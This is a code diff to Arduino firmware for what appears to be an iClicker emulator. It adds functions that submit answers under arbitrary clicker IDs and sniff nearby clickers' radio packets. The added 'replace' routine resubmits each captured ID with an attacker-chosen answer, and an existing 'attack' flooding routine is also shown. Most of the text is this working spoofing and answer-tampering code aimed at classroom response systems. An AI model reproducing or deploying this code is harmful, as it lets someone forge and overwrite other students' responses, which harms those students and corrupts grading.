@@ -24,7 +24,7 @@
 #define SERIAL_BAUD_RATE 115200 //Baud rate
 #define MAX_BUFFERED_PACKETS 5 //The capability of radio receiving buffer
 #define MAX_SERIAL_COMMAND_LENGTH 20 //The max length of the command from serial ports
-#define SERIAL_NO_COMMAND_WAIT_TIME 3000 //The time to promote for input if there is no input command
+#define SERIAL_NO_COMMAND_WAIT_TIME 3000 //The waiting time to promote for input if there is no input command
 /*End Important Constants*/
 
 //Global Variables
@@ -74,10 +74,13 @@ void loop()
 	}
 	case OP_SUBMIT:
 	{
+		submitMode();
 		break;
 	}
 	case OP_ANSWER:
 	{
+		//Repeat 10 times to make sure it succeed, since we can't decode ACK from the base.
+		answer(serialCommand[0], 10);
 		break;
 	}
 	case OP_CHANGE_CHANNEL:
@@ -92,6 +95,7 @@ void loop()
 	}
 	case OP_REPLACE:
 	{
+		replace(serialCommand[0]);
 		break;
 	}
 	case OP_RESET:
@@ -155,6 +159,63 @@ static inline void capture()
 	Serial.println(F("End Capture"));
 }
 
+static inline void answer(const char cAns, const uint8_t repeat)
+{
+	uint8_t thisID[4];
+	intToByteArray(FIXED_ISKIPPER_ID, thisID);
+	Serial.println(F("Submit Answer:"));
+	Serial.println(cAns);
+	for (uint8_t i = 0; i < repeat; i++)
+	{
+		clicker.submitAnswer(thisID, clicker.charAnswer(cAns), false);
+		Serial.println(F("Submit Success!"));
+		Serial.println(RES_SUCCESS);
+	}
+}
+
+static inline void submitMode()
+{
+	Serial.println(F("Start SUBMIT mode, waiting for input..."));
+	Serial.println(RES_SUCCESS);
+	/*Format:
+	*	<Answer>,<ID>\0
+	*/
+	uint8_t readLength = 0;
+	char answerAndID[11];//Answer for 1 byte, comma for 1 byte, ID for 8 byte,\0 for 1 byte
+	while (true)
+	{
+		while (readLength < sizeof(answerAndID) - 1)
+		{
+			while (Serial.available() <= 0);//Wait for input
+			char c;
+			Serial.readBytes(&c, 1);
+			if (c == OP_STOP)
+				goto end; //End here
+			answerAndID[readLength++] = c;
+			if (c == '\0' && readLength != sizeof(answerAndID) - 1)//That means the input is not in correct forms.
+			{
+				readLength = 0;
+				continue;
+			}
+		}
+		readLength = 0;
+		char cAns = answerAndID[0];
+		uint32_t iID = strtoul(&answerAndID[2], NULL, 16);
+		uint8_t arrID[4];
+		intToByteArray(iID, arrID);
+		if (!clicker.validId(arrID))
+		{
+			Serial.println(F("Invalid ID"));
+			continue;
+		}
+		clicker.submitAnswer(arrID, clicker.charAnswer(cAns), false);
+		Serial.println(RES_SUCCESS);
+	}
+end:
+	Serial.println(F("End SUBMIT mode."));
+	return;
+}
+
 static inline void attack(const char cAns, unsigned long count)
 {
 	/*Command Format:
@@ -167,7 +228,7 @@ static inline void attack(const char cAns, unsigned long count)
 	Serial.println(RES_SUCCESS);
 	iClickerAnswer ans;
 	uint8_t id[ICLICKER_ID_LEN];
-	for (unsigned long i = 0; i < count && !shouldStop(); i++) 
+	for (unsigned long i = 0; i < count && !shouldStop(); i++)
 	{
 		if ((cAns >= 'A' && cAns <= 'E') || cAns == 'P')
 			ans = clicker.charAnswer(cAns);
@@ -203,6 +264,38 @@ static inline void changeChannel(const char* const arguments)
 		Serial.print(arguments[1]);
 		Serial.println();
 	}
+}
+
+static inline void replace(const char cTargetAns)
+{
+	/*Start Replacing Response Format:
+	*	Start capture\n
+	*	[ACK]\n
+	*/
+	Serial.println(F("Start Replacing"));
+	Serial.println(RES_SUCCESS);
+
+	const char reponseFormat[] = "Replaced,%c,%02X%02X%02X%02X\n"; //Reponse Format
+	iClickerPacket r;
+	uint8_t* id;
+	char ans;
+	char msg[30];
+	clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
+	while (!shouldStop())
+	{
+		clicker.stopPromiscuous();
+		while (recvBuf.pull(&r))
+		{
+			id = r.packet.answerPacket.id;
+			ans = iClickerEmulator::answerChar(r.packet.answerPacket.answer);
+			clicker.submitAnswer(id, clicker.charAnswer(cTargetAns));
+			snprintf(msg, sizeof(msg), reponseFormat, ans, id[0], id[1], id[2], id[3]);
+			printf(msg);
+		}
+		clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
+	}
+	clicker.stopPromiscuous();
+	Serial.println(F("End Replacing"));
 }
 
 /*
